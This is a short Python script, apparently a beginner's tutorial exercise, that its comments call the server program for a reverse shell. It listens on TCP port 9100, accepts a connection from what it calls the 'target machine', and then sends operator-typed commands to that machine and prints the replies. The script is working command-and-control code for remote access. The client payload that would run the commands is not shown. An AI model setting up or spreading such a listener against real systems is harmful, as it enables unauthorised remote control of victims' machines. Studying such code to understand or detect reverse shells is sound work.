#the Server program to demonstrate the Reverse Shell 
#The Socket is the end point of a Network Connection !
import socket 
HOST=''
#the port must be in the range of 0-65535(0-1024 reserved)
PORT=9100
try:
	print('Establishing a TCP Connection !')
	soc=socket.socket()
	#now we have to bind the ip address to the port number !
	#the function parameter for the bind method is a tuple
	print(f'Binding to the Port {PORT}')
	soc.bind((HOST,PORT))
	#this implies how many computers can wait for the sever prior to timeout
	soc.listen(5)
	#now we have to accept the connection from the client !(target machine )
	print('Waiting for Someone to Connect !')
	conn,addr=soc.accept()
	print(f'Now we \'re connected to IP: {addr[0]} and Listening On Port: {addr[1]}')
	cmd=''
	print('Ready to Chat !')
	while True:
		if cmd.lower()=='quit':
			conn.close()
			soc.close()
			print('Bye Client !')
			break
		cmd=input('>>')
		print('Server: ',cmd)
		conn.send(cmd.encode())
		print('Client: ',conn.recv(1024).decode())
	print('Client Be Like:',conn.recv(1024).decode())
except socket.error as s_err:
	print('The Socket Creation Error !'+str(s_err))

